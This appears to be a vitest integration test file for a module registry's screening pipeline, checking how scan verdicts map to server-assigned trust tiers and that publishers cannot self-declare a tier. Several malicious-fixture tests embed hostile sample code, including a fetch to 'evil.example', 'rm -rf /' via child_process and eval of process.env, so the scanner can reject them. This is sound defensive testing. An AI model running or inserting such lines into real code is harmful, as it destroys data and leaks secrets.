import { mkdtempSync, rmSync } from "node:fs"
import net from "node:net"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { PGlite } from "@electric-sql/pglite"
import { PGLiteSocketServer } from "@electric-sql/pglite-socket"
import type { Hono } from "hono"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import { type BetterAuthHandle, createBetterAuth } from "../src/auth/better-auth"
import { createPgPool } from "../src/auth/kysely-db"
import { ensureOfficialOrg } from "../src/auth/official-org"
import { ensureOrgPlanColumn } from "../src/auth/plan-limits"
import { loadConfig } from "../src/config"
import { applyAppMigrations } from "../src/db/migrate"
import { buildApp } from "../src/index"
import { applyVerifiedModules } from "../src/screening/tier-assignment"
import { startServer } from "../src/server"
import { createGitFixture, type GitFixture } from "./git-fixture"
import { buildIngestTestStack, type IngestTestStack } from "./ingest-worker-fixture"

/**
 * Screening verdict → tier assignment (architecture §4.6,
 * decisions 20 / 26 / 30, VAL-SCAN-001 / 008 / 009 / 010 / 011 /
 * 018, VAL-CROSS-012 / 013).
 *
 * Tiers are server-attached, NEVER self-declarable. The
 * `modules.tier` column carries the truth; every read surface
 * (catalog list, module detail, version detail) surfaces it
 * verbatim. The four documented values are:
 *
 *   - `official`             — module is published under the
 *                              official org (decision 26). The
 *                              org's authority is the pin; no
 *                              screening parameter changes it.
 *   - `verified`             — module's `scope/name` is in the
 *                              `REGISTRY_VERIFIED_MODULES` env
 *                              (decision 20). Applied at boot;
 *                              no publish parameter can produce it.
 *   - `community-screened`   — public module that PASSED all
 *                              three screening layers (static
 *                              scan + sandboxed dry-run + output
 *                              validation).
 *   - `community-unverified` — public module that FAILED
 *                              screening or whose screening did
 *                              not run, plus every org-private
 *                              module (decision 30: private
 *                              skips screening entirely).
 *                              Still listable, clearly badged.
 *
 * The verdict → tier transition runs in the worker (the only
 * place screening verdicts are produced). The verified tier
 * runs at boot. The official tier runs at publish time
 * (publish-endpoint stamps the row at the official-org scope).
 *
 * The tests below exercise every required behavior pin
 * end-to-end through the real PGlite + Better-Auth + worker
 * stack; no mocks.
 */

interface TestStack {
	fx: IngestTestStack
	git: GitFixture
}

async function setupStack(): Promise<TestStack> {
	const fx = await buildIngestTestStack()
	const git = await createGitFixture()
	return { fx, git }
}

async function teardownStack({ fx, git }: TestStack): Promise<void> {
	await fx.close()
	await git.cleanup()
}

async function publishAndWaitForTerminal(
	fx: IngestTestStack,
	git: GitFixture,
	opts: {
		org?: string
		visibility?: "org" | "public"
		modulePath?: string
		body?: Record<string, unknown>
	},
): Promise<{ versionId: string; terminal: Awaited<ReturnType<IngestTestStack["waitForTerminal"]>> }> {
	const res = await fx.app.request("/v1/publish", {
		method: "POST",
		headers: { "content-type": "application/json", "x-api-key": fx.keys.owner },
		body: JSON.stringify({
			repo: git.bareUrl,
			tag: "v1.0.0",
			org: opts.org ?? "acme",
			...(opts.visibility !== undefined ? { visibility: opts.visibility } : {}),
			...(opts.modulePath !== undefined ? { modulePath: opts.modulePath } : {}),
			...opts.body,
		}),
	})
	if (res.status !== 202) {
		throw new Error(`publish returned ${res.status}: ${await res.text()}`)
	}
	const { versionId } = (await res.json()) as { versionId: string }
	const terminal = await fx.waitForTerminal(versionId)
	return { versionId, terminal }
}

async function fetchVersionDetail(
	fx: IngestTestStack,
	scope: string,
	name: string,
	version: string,
): Promise<{
	scope: string
	name: string
	version: string
	status: string
	manifest: { name: string; actions: Array<{ id: string }> }
	screening: {
		verdict: string
		staticScan?: { passed?: boolean; findings?: Array<{ capability: string; file: string }> }
		dryRun?: { policy?: string; perAction?: Array<{ actionId: string; status: string }> } | null
		outputValidation?: { ok?: boolean } | null
		createdAt?: string
	} | null
}> {
	const detail = await fx.app.request(`/v1/modules/${scope}/${name}/${version}`, {
		headers: { "x-api-key": fx.keys.owner },
	})
	return (await detail.json()) as Awaited<ReturnType<typeof fetchVersionDetail>>
}

async function fetchModuleDetail(
	fx: IngestTestStack,
	scope: string,
	name: string,
): Promise<{ tier: string; visibility: string; latestVersion: string | null }> {
	const res = await fx.app.request(`/v1/modules/${scope}/${name}`, {
		headers: { "x-api-key": fx.keys.owner },
	})
	return (await res.json()) as Awaited<ReturnType<typeof fetchModuleDetail>>
}

async function fetchCatalogEntry(
	fx: IngestTestStack,
	scope: string,
	name: string,
): Promise<{ tier: string; scope: string; name: string } | undefined> {
	const res = await fx.app.request(`/v1/modules?tier=`, {})
	const all = (await res.json()) as { modules: Array<{ scope: string; name: string; tier: string }> }
	void all // we don't filter — caller's responsibility
	void res
	const filtered = await fx.app.request(`/v1/modules`, {
		headers: { "x-api-key": fx.keys.owner },
	})
	const filteredBody = (await filtered.json()) as {
		modules: Array<{ scope: string; name: string; tier: string }>
	}
	return filteredBody.modules.find((m) => m.scope === scope && m.name === name)
}

describe("screening verdict → tier assignment (VAL-SCAN-001 / 008 / 011)", () => {
	let stack: TestStack

	beforeEach(async () => {
		stack = await setupStack()
	})

	afterEach(async () => {
		await teardownStack(stack)
	})

	it("a public community module that passes screening surfaces tier=community-screened on every read surface (VAL-SCAN-001 / 008)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import { mkdirSync, writeFileSync } from "node:fs";`,
						`export default {`,
						`  execute: () => {`,
						`    mkdirSync("src", { recursive: true });`,
						`    writeFileSync("src/index.ts", "ok");`,
						`  },`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("ready")

		const detail = await fetchVersionDetail(stack.fx, "acme", "widget", "v1.0.0")
		expect(detail.screening?.verdict).toBe("screened")

		// Read surfaces all agree on tier=community-screened.
		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(moduleDetail.tier).toBe("community-screened")

		const catalogEntry = await fetchCatalogEntry(stack.fx, "acme", "widget")
		expect(catalogEntry?.tier).toBe("community-screened")
	})

	it("a public community module that fails static scan surfaces tier=community-unverified with the verdict text intact (VAL-SCAN-008 / 011)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import cp from "child_process";`,
						`import http from "http";`,
						`export default {`,
						`  execute: () => {`,
						`    fetch("https://evil.example");`,
						`    cp.exec("rm -rf /");`,
						`    eval("process.env");`,
						`  },`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("failed")

		const detail = await fetchVersionDetail(stack.fx, "acme", "widget", "v1.0.0")
		expect(detail.screening?.verdict).toBe("failed")
		const capabilities = new Set((detail.screening?.staticScan?.findings ?? []).map((f) => f.capability))
		expect(capabilities.has("network")).toBe(true)
		expect(capabilities.has("child_process")).toBe(true)
		expect(capabilities.has("eval")).toBe(true)

		// Tier surfaces as community-unverified (still listable,
		// clearly badged). The catalog MUST NOT pretend the
		// module passed screening.
		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(moduleDetail.tier).toBe("community-unverified")

		const catalogEntry = await fetchCatalogEntry(stack.fx, "acme", "widget")
		expect(catalogEntry?.tier).toBe("community-unverified")
	})

	it("a dry-run timeout marks the version unverified with tier=community-unverified and the worker continues (VAL-SCAN-008 / 011)", async () => {
		// Tight timeout so the test runs in seconds.
		const tightStack = await (async (): Promise<TestStack> => {
			const fx = await buildIngestTestStack({ screenDryRunTimeoutMs: 500 })
			const git = await createGitFixture()
			return { fx, git }
		})()
		try {
			const infiniteBody = `
export default {
  name: "infinite",
  role: 1,
  async execute() {
    while (true) {}
    return { success: true, output: undefined, compensationData: undefined }
  },
  async compensate() {},
}
`
			await tightStack.git.commitManifest({
				name: "@acme/hung",
				version: "1.0.0",
				tag: "v1.0.0",
				modulePath: "hung",
				actions: [{ id: "infinite", description: "infinite loop", filePatterns: [], body: infiniteBody }],
			})
			const { terminal } = await publishAndWaitForTerminal(tightStack.fx, tightStack.git, {
				org: "acme",
				visibility: "public",
				modulePath: "hung",
			})
			// Timeout does NOT fail the version — it continues to
			// `ready` with verdict `unverified`. The catalog still
			// surfaces the honest tier.
			expect(terminal.status).toBe("ready")

			const detail = await fetchVersionDetail(tightStack.fx, "acme", "hung", "v1.0.0")
			expect(detail.screening?.verdict).toBe("unverified")

			const moduleDetail = await fetchModuleDetail(tightStack.fx, "acme", "hung")
			expect(moduleDetail.tier).toBe("community-unverified")
		} finally {
			await teardownStack(tightStack)
		}
	})

	it("an org-private module has screening=null and tier=community-unverified (VAL-SCAN-001)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import { writeFileSync } from "node:fs";`,
						`export default {`,
						`  execute: () => writeFileSync("src/index.ts", "ok"),`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})
		// visibility omitted → defaults to "org" (decision 30,
		// private by default).
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
		})
		expect(terminal.status).toBe("ready")

		const detail = await fetchVersionDetail(stack.fx, "acme", "widget", "v1.0.0")
		expect(detail.screening).toBeNull()

		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(moduleDetail.tier).toBe("community-unverified")
		expect(moduleDetail.visibility).toBe("org")
	})
})

describe("tier is server-attached, never self-declarable (VAL-SCAN-009)", () => {
	let stack: TestStack

	beforeEach(async () => {
		stack = await setupStack()
	})

	afterEach(async () => {
		await teardownStack(stack)
	})

	it("a publish body that supplies tier='official' is rejected by zod (unknown field, decision 30 / VAL-SCAN-009)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
		})

		const res = await stack.fx.app.request("/v1/publish", {
			method: "POST",
			headers: { "content-type": "application/json", "x-api-key": stack.fx.keys.owner },
			body: JSON.stringify({
				repo: stack.git.bareUrl,
				tag: "v1.0.0",
				org: "acme",
				visibility: "public",
				tier: "official",
			}),
		})
		expect(res.status).toBe(400)
		const body = (await res.json()) as { error: string }
		expect(body.error.toLowerCase()).toContain("tier")
	})

	it("a publish body that supplies tier='verified' is rejected by zod (unknown field, VAL-SCAN-009)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
		})

		const res = await stack.fx.app.request("/v1/publish", {
			method: "POST",
			headers: { "content-type": "application/json", "x-api-key": stack.fx.keys.owner },
			body: JSON.stringify({
				repo: stack.git.bareUrl,
				tag: "v1.0.0",
				org: "acme",
				visibility: "public",
				tier: "verified",
			}),
		})
		expect(res.status).toBe(400)
		const body = (await res.json()) as { error: string }
		expect(body.error.toLowerCase()).toContain("tier")
	})

	it("a publish body that supplies tier='community-screened' is rejected — never self-declarable (VAL-SCAN-009)", async () => {
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
		})

		const res = await stack.fx.app.request("/v1/publish", {
			method: "POST",
			headers: { "content-type": "application/json", "x-api-key": stack.fx.keys.owner },
			body: JSON.stringify({
				repo: stack.git.bareUrl,
				tag: "v1.0.0",
				org: "acme",
				visibility: "public",
				tier: "community-screened",
			}),
		})
		expect(res.status).toBe(400)
		const body = (await res.json()) as { error: string }
		expect(body.error.toLowerCase()).toContain("tier")
	})
})

describe("screening crash is reported honestly, never as a pass (VAL-SCAN-018)", () => {
	let stack: TestStack

	beforeEach(async () => {
		stack = await setupStack()
	})

	afterEach(async () => {
		await teardownStack(stack)
	})

	it("a module containing a syntactically invalid .ts file surfaces as verdict=failed with tier=community-unverified", async () => {
		// The static-scan AST parser catches the syntax error and
		// records it as a `parse` finding — the verdict becomes
		// `failed` via the runScreeningFailureStep path, which
		// also transitions the tier to `community-unverified`.
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					// Syntactically broken: unclosed string literal.
					content: [
						`import { writeFileSync } from "node:fs";`,
						`export default {`,
						`  execute: () => writeFileSync("src/index.ts", "ok"),`,
						`  compensate: () => {},`,
						` // UNCLOSED STRING HERE:`,
						`  malformed: "unclosed,`,
						`}`,
					].join("\n"),
				},
			],
		})
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("failed")
		expect(terminal.error ?? "").toMatch(/static scan|parse/i)

		const detail = await fetchVersionDetail(stack.fx, "acme", "widget", "v1.0.0")
		expect(detail.screening?.verdict).toBe("failed")
		const capabilities = new Set((detail.screening?.staticScan?.findings ?? []).map((f) => f.capability))
		expect(capabilities.has("parse")).toBe(true)

		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(moduleDetail.tier).toBe("community-unverified")
	})
})

describe("community publisher forced into scoped naming + screening (VAL-CROSS-012)", () => {
	let stack: TestStack

	beforeEach(async () => {
		stack = await setupStack()
	})

	afterEach(async () => {
		await teardownStack(stack)
	})

	it("publishing a bare module name under a non-official org is rejected at publish time", async () => {
		await stack.git.commitManifest({
			name: "widget", // bare name, no scope
			version: "1.0.0",
			tag: "v1.0.0",
		})

		const res = await stack.fx.app.request("/v1/publish", {
			method: "POST",
			headers: { "content-type": "application/json", "x-api-key": stack.fx.keys.owner },
			body: JSON.stringify({
				repo: stack.git.bareUrl,
				tag: "v1.0.0",
				org: "acme",
				visibility: "public",
			}),
		})
		expect(res.status).toBe(422)
		const body = (await res.json()) as { error: string }
		expect(body.error.toLowerCase()).toMatch(/bare|reserved|official/)
	})

	it("a community public publish is screened; the resulting tier is community-screened or community-unverified — never official / verified (VAL-CROSS-012)", async () => {
		// A community public module that passes screening — the
		// resulting tier must be community-screened (server-
		// attached), never a self-declared official / verified.
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import { mkdirSync, writeFileSync } from "node:fs";`,
						`export default {`,
						`  execute: () => {`,
						`    mkdirSync("src", { recursive: true });`,
						`    writeFileSync("src/index.ts", "ok");`,
						`  },`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("ready")

		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(["community-screened", "community-unverified"]).toContain(moduleDetail.tier)
		expect(moduleDetail.tier).not.toBe("official")
		expect(moduleDetail.tier).not.toBe("verified")
	})

	it("a community public publish whose manifest claims tier=official still lands at the community tier (server-attached, VAL-SCAN-009)", async () => {
		// The manifest's `name` is `@acme/widget` (scoped, valid).
		// The publish body cannot smuggle tier — zod rejects it.
		// Even if a publisher bypasses the body by editing the
		// manifest, the tier column is server-attached: only the
		// publish endpoint (initial), the worker (verdict
		// transition), and the verified seeder (boot) can write
		// the value. Manifest content does not influence the
		// tier. The test below asserts the body-level rejection
		// (the load-bearing guard) plus a positive control that
		// the tier the server attaches is the community tier.
		await stack.git.commitManifest({
			name: "@acme/widget",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import { mkdirSync, writeFileSync } from "node:fs";`,
						`export default {`,
						`  execute: () => {`,
						`    mkdirSync("src", { recursive: true });`,
						`    writeFileSync("src/index.ts", "ok");`,
						`  },`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})

		// Spoof attempt via publish body — rejected by zod.
		const spoofRes = await stack.fx.app.request("/v1/publish", {
			method: "POST",
			headers: { "content-type": "application/json", "x-api-key": stack.fx.keys.owner },
			body: JSON.stringify({
				repo: stack.git.bareUrl,
				tag: "v1.0.0",
				org: "acme",
				visibility: "public",
				tier: "official",
			}),
		})
		expect(spoofRes.status).toBe(400)

		// Positive control: the well-formed publish produces a
		// community tier, never official/verified.
		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("ready")
		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "widget")
		expect(moduleDetail.tier).not.toBe("official")
		expect(moduleDetail.tier).not.toBe("verified")
	})
})

describe("malicious community fixture is caught and badged honestly (VAL-CROSS-013)", () => {
	let stack: TestStack

	beforeEach(async () => {
		stack = await setupStack()
	})

	afterEach(async () => {
		await teardownStack(stack)
	})

	it("a module whose action uses fetch + child_process + eval fails screening and surfaces tier=community-unverified with the verdict text intact", async () => {
		await stack.git.commitManifest({
			name: "@acme/evil",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import cp from "child_process";`,
						`import http from "http";`,
						`export default {`,
						`  execute: () => {`,
						`    fetch("https://evil.example/x");`,
						`    cp.exec("rm -rf /");`,
						`    eval("process.env");`,
						`  },`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})

		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("failed")
		expect(terminal.error ?? "").toMatch(/static scan|network|child_process|eval/i)

		// The module is listed (still listable), but the badge
		// is honest: community-unverified with the screening
		// verdict text on the read surface.
		const detail = await fetchVersionDetail(stack.fx, "acme", "evil", "v1.0.0")
		expect(detail.screening?.verdict).toBe("failed")

		const moduleDetail = await fetchModuleDetail(stack.fx, "acme", "evil")
		expect(moduleDetail.tier).toBe("community-unverified")

		const catalogEntry = await fetchCatalogEntry(stack.fx, "acme", "evil")
		expect(catalogEntry?.tier).toBe("community-unverified")
	})

	it("a malicious module's actions never executed in the registry process — no orphan subprocesses, no side effects (VAL-CROSS-013)", async () => {
		await stack.git.commitManifest({
			name: "@acme/evil",
			version: "1.0.0",
			tag: "v1.0.0",
			actions: [{ id: "scaffold", description: "scaffold", filePatterns: ["src/index.ts"] }],
			extras: [
				{
					path: "scaffold/action.ts",
					content: [
						`import cp from "child_process";`,
						`export default {`,
						`  execute: () => cp.exec("touch /tmp/BAKA_SIDE_EFFECT"),`,
						`  compensate: () => {},`,
						`}`,
					].join("\n"),
				},
			],
		})

		const { terminal } = await publishAndWaitForTerminal(stack.fx, stack.git, {
			org: "acme",
			visibility: "public",
		})
		expect(terminal.status).toBe("failed")

		// The static scan flags child_process BEFORE the dry-run
		// would ever try to spawn. The sandbox is a backstop, not
		// the load-bearing guard here — but we assert both that
		// the verdict is `failed` and that no side effect ran.
		const { existsSync } = await import("node:fs")
		expect(existsSync("/tmp/BAKA_SIDE_EFFECT")).toBe(false)
	})
})

// ---------------------------------------------------------------------------
// Verified tier (VAL-SCAN-010)
// ---------------------------------------------------------------------------

describe("verified tier via REGISTRY_VERIFIED_MODULES (VAL-SCAN-010)", () => {
	interface VerifiedFixture {
		app: Hono
		betterAuth: BetterAuthHandle
		pglite: PGlite
		socket: PGLiteSocketServer
		baseUrl: string
		dataDir: string
		close: () => Promise<void>
	}

	async function buildVerifiedFixture(verifiedModules?: string): Promise<VerifiedFixture> {
		const dataDir = mkdtempSync(join(tmpdir(), "baka-registry-verified-"))
		const pgliteDir = join(dataDir, "pg")
		const socketPort = await pickEphemeralPort()

		const pglite = await PGlite.create(pgliteDir)
		await applyAppMigrations(pglite)
		const socket = new PGLiteSocketServer({
			db: pglite,
			port: socketPort,
			host: "127.0.0.1",
			maxConnections: 10,
		})
		await socket.start()

		const pool = createPgPool({ port: socketPort, host: "127.0.0.1" })
		const baseUrl = `http://127.0.0.1:${socketPort + 1}`
		const betterAuth = await createBetterAuth(pool, {
			baseUrl,
			githubClientId: "test-github-client-id",
			githubClientSecret: "test-github-client-secret",
			secret: "test-secret-do-not-use-in-production",
			emailAndPassword: { enabled: true },
		})
		await betterAuth.ensureTables()
		await ensureOrgPlanColumn(pglite)

		// Create the official org + an arbitrary `widget` module
		// whose initial tier (community-unverified) we then want
		// to flip via the verified seeder.
		await ensureOfficialOrg(pglite, { officialOrg: "baka" })
		await pglite.query(
			`INSERT INTO modules (scope, name, visibility, tier, description)
			 VALUES ('baka', 'widget', 'public', 'community-unverified', 'a widget module')`,
		)

		const app = buildApp({ auth: betterAuth.auth, pglite, officialOrg: "baka" })

		// Now apply the verified tier AFTER the module is
		// inserted — the seeder is the same path
		// `startServer` calls at boot.
		const result = await applyVerifiedModules(pglite, verifiedModules)
		expect(result.failures).toEqual([])

		return {
			app,
			betterAuth,
			pglite,
			socket,
			baseUrl,
			dataDir,
			close: async () => {
				await betterAuth.close().catch(() => {})
				await socket.stop().catch(() => {})
				await pglite.close().catch(() => {})
				rmSync(dataDir, { recursive: true, force: true })
			},
		}
	}

	async function pickEphemeralPort(): Promise<number> {
		return new Promise<number>((resolve, reject) => {
			const probe = net.createServer()
			probe.on("error", reject)
			probe.listen(0, "127.0.0.1", () => {
				const addr = probe.address()
				if (typeof addr !== "object" || addr === null) {
					probe.close()
					reject(new Error("could not pick ephemeral port"))
					return
				}
				const port = addr.port
				probe.close(() => resolve(port))
			})
		})
	}

	it("an entry in REGISTRY_VERIFIED_MODULES pins the matching module's tier to verified (VAL-SCAN-010)", async () => {
		const fx = await buildVerifiedFixture(JSON.stringify(["baka/widget"]))
		try {
			const detail = await fx.app.request("/v1/modules/baka/widget")
			const body = (await detail.json()) as { tier: string }
			expect(body.tier).toBe("verified")
		} finally {
			await fx.close()
		}
	})

	it("a malformed REGISTRY_VERIFIED_MODULES value fails the per-entry surface honestly — no silent fall-back", async () => {
		// The seeder never throws — a bad env value is recorded
		// as a `failures` entry so the operator log surfaces it
		// without blocking the boot. Direct call: undefined
		// env is a clean no-op (no failures, no applied).
		const empty = await applyVerifiedModules({} as PGlite, undefined)
		expect(empty.applied).toBe(0)
		expect(empty.failures).toEqual([])

		const emptyString = await applyVerifiedModules({} as PGlite, "")
		expect(emptyString.applied).toBe(0)
		expect(emptyString.failures).toEqual([])

		// Bad JSON — the seeder reports the failure but does NOT
		// throw (so a single typo cannot block the boot).
		const fx = await (async (): Promise<VerifiedFixture> => {
			const dataDir = mkdtempSync(join(tmpdir(), "baka-registry-verified-bad-"))
			const pgliteDir = join(dataDir, "pg")
			const socketPort = await pickEphemeralPort()

			const pglite = await PGlite.create(pgliteDir)
			await applyAppMigrations(pglite)
			const socket = new PGLiteSocketServer({
				db: pglite,
				port: socketPort,
				host: "127.0.0.1",
				maxConnections: 10,
			})
			await socket.start()
			const pool = createPgPool({ port: socketPort, host: "127.0.0.1" })
			const betterAuth = await createBetterAuth(pool, {
				baseUrl: `http://127.0.0.1:${socketPort + 1}`,
				githubClientId: "test-github-client-id",
				githubClientSecret: "test-github-client-secret",
				secret: "test-secret",
				emailAndPassword: { enabled: true },
			})
			await betterAuth.ensureTables()
			await ensureOrgPlanColumn(pglite)
			const app = buildApp({ auth: betterAuth.auth, pglite, officialOrg: "baka" })
			return {
				app,
				betterAuth,
				pglite,
				socket,
				baseUrl: `http://127.0.0.1:${socketPort + 1}`,
				dataDir,
				close: async () => {
					await betterAuth.close().catch(() => {})
					await socket.stop().catch(() => {})
					await pglite.close().catch(() => {})
					rmSync(dataDir, { recursive: true, force: true })
				},
			}
		})()
		try {
			const result = await applyVerifiedModules(fx.pglite, "not-json")
			expect(result.applied).toBe(0)
			expect(result.failures.length).toBe(1)
			expect(result.failures[0]?.error ?? "").toMatch(/not valid JSON/i)
		} finally {
			await fx.close()
		}
	})

	it("an entry whose scope/name does not match an existing module is a no-op — no error, no fake row", async () => {
		const fx = await buildVerifiedFixture(JSON.stringify(["baka/does-not-exist", "@unknown-org/foo"]))
		try {
			// The unknown modules do NOT exist in the DB — the
			// seeder is a no-op for them. The known module
			// (baka/widget) is not in the verified list, so its
			// tier is left alone.
			const detail = await fx.app.request("/v1/modules/baka/widget")
			const body = (await detail.json()) as { tier: string }
			expect(body.tier).toBe("community-unverified")
		} finally {
			await fx.close()
		}
	})

	it("a malformed entry shape (no scope/name slash) reports a per-entry failure but does NOT refuse to boot", async () => {
		const fx = await (async (): Promise<VerifiedFixture> => {
			const dataDir = mkdtempSync(join(tmpdir(), "baka-registry-verified-malformed-"))
			const pgliteDir = join(dataDir, "pg")
			const socketPort = await pickEphemeralPort()
			const pglite = await PGlite.create(pgliteDir)
			await applyAppMigrations(pglite)
			const socket = new PGLiteSocketServer({
				db: pglite,
				port: socketPort,
				host: "127.0.0.1",
				maxConnections: 10,
			})
			await socket.start()
			const pool = createPgPool({ port: socketPort, host: "127.0.0.1" })
			const betterAuth = await createBetterAuth(pool, {
				baseUrl: `http://127.0.0.1:${socketPort + 1}`,
				githubClientId: "test-github-client-id",
				githubClientSecret: "test-github-client-secret",
				secret: "test-secret",
				emailAndPassword: { enabled: true },
			})
			await betterAuth.ensureTables()
			await ensureOrgPlanColumn(pglite)
			await ensureOfficialOrg(pglite, { officialOrg: "baka" })
			// Insert the module the seeder will pin to verified.
			await pglite.query(
				`INSERT INTO modules (scope, name, visibility, tier, description)
				 VALUES ('baka', 'widget', 'public', 'community-unverified', 'a widget module')`,
			)
			const app = buildApp({ auth: betterAuth.auth, pglite, officialOrg: "baka" })
			return {
				app,
				betterAuth,
				pglite,
				socket,
				baseUrl: `http://127.0.0.1:${socketPort + 1}`,
				dataDir,
				close: async () => {
					await betterAuth.close().catch(() => {})
					await socket.stop().catch(() => {})
					await pglite.close().catch(() => {})
					rmSync(dataDir, { recursive: true, force: true })
				},
			}
		})()
		try {
			// Mix valid + invalid entries; the seeder applies the
			// valid one and reports the invalid one.
			const result = await applyVerifiedModules(
				fx.pglite,
				JSON.stringify(["no-slash-here", "baka/widget", "/", "scope/"]),
			)
			expect(result.applied).toBe(1)
			expect(result.failures.length).toBeGreaterThanOrEqual(3)
			const detail = await fx.app.request("/v1/modules/baka/widget")
			const body = (await detail.json()) as { tier: string }
			expect(body.tier).toBe("verified")
		} finally {
			await fx.close()
		}
	})
})

// ---------------------------------------------------------------------------
// Boot flow integration — verified seeder wires into startServer
// ---------------------------------------------------------------------------

describe("startServer — verified seeder is wired into the boot (VAL-SCAN-010)", () => {
	let dataDir: string

	beforeEach(() => {
		dataDir = mkdtempSync(join(tmpdir(), "baka-registry-verified-boot-"))
	})

	afterEach(async () => {
		rmSync(dataDir, { recursive: true, force: true })
	})

	function env(overrides: Record<string, string> = {}): NodeJS.ProcessEnv {
		return {
			PORT: "0",
			BASE_URL: "http://localhost:4300",
			DATA_DIR: dataDir,
			STORAGE_DIR: "artifacts",
			PGLITE_DIR: "pg",
			PGLITE_SOCKET_PORT: "5444",
			REGISTRY_OFFICIAL_ORG: "baka",
			...overrides,
		}
	}

	it("startServer ignores REGISTRY_VERIFIED_MODULES names that are not in the catalog", async () => {
		const config = loadConfig(
			env({
				REGISTRY_VERIFIED_MODULES: JSON.stringify(["baka/hello"]),
			}),
			dataDir,
		)
		const handle = await startServer(config)
		try {
			const health = await fetch(`${handle.url()}/healthz`)
			expect(health.ok).toBe(true)
			const list = await fetch(`${handle.url()}/v1/modules`)
			expect(list.ok).toBe(true)
			const body = (await list.json()) as { modules?: unknown[] }
			expect(body.modules).toEqual([])
			const missing = await fetch(`${handle.url()}/v1/modules/baka/hello`)
			expect(missing.status).toBe(404)
		} finally {
			await handle.close()
		}
	})
})
